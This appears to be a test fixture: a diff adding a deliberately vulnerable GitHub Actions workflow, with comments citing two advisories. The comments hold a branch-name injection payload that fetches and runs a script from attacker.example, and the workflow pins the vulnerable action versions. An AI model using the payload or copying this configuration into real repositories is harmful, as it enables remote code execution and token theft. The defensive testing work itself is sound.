@@ -1,0 +1,49 @@
+# situation: on pull_request_target, a step uses wktk/conflibot pinned to the
+#   commit of v1.2.0, and a step on push uses
+#   BoldestDungeon/steam-workshop-deploy pinned to the commit of v1.0.1 after
+#   actions/checkout. The advisories name no workflow; the steps that use the
+#   actions follow the configurations that the advisories describe:
+#   GHSA-2qvg-qr73-mqxp, "The recommended workflow runs conflibot on the
+#   `pull_request_target` event", and GHSA-x6gv-2rvh-qmp6, a checkout with
+#   actions/checkout whose credential is a personal access token, which does not
+#   expire when the job ends.
+# reason: GHSA-2qvg-qr73-mqxp, which GitHub rates critical, says the code of
+#   conflibot before 1.2.1 builds git commands with the names of the branches of
+#   pull requests and runs them through a shell; GHSA-x6gv-2rvh-qmp6, which
+#   GitHub rates critical, says steam-workshop-deploy before 2.0.0 puts the .git
+#   directory, with the credential in .git/config, in the item it publishes.
+#   Both are in the code of the action, which the workflow does not show.
+# attack: the author of a pull request from a fork names the head branch of
+#   the pull request a$(curl${IFS}-sSf${IFS}https://attacker.example/x|sh) and
+#   opens the pull request (the job conflict); one who subscribes to the item of
+#   the Steam Workshop downloads the item (the job deploy).
+# attack-run-behavior: conflibot v1.2.0 runs a git command with the name of
+#   the branch through a shell, which runs the command substitution with the
+#   write token of pull_request_target; steam-workshop-deploy v1.0.1 publishes
+#   .git/config with the personal access token of the checkout.
+# advisory: https://github.com/advisories/GHSA-2qvg-qr73-mqxp
+# advisory: https://github.com/advisories/GHSA-x6gv-2rvh-qmp6
+on:
+  pull_request_target:
+  push:
+jobs:
+  conflict:
+    if: github.event_name == 'pull_request_target'
+    runs-on: ubuntu-latest
+    steps:
+      - uses: wktk/conflibot@4881912dc3fe459059127d667251d5b324622299 # v1.2.0
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+  deploy:
+    if: github.event_name == 'push'
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.MOD_REPOSITORY_TOKEN }}
+      - uses: BoldestDungeon/steam-workshop-deploy@a6e5b5fa5963fb5b9e22c7e0dfa046a1481c4974 # v1.0.1
+        with:
+          username: ${{ secrets.STEAM_USERNAME }}
+          configVdf: ${{ secrets.STEAM_CONFIG_VDF }}
+          appId: 763890
+          publishedFileId: 1234567890
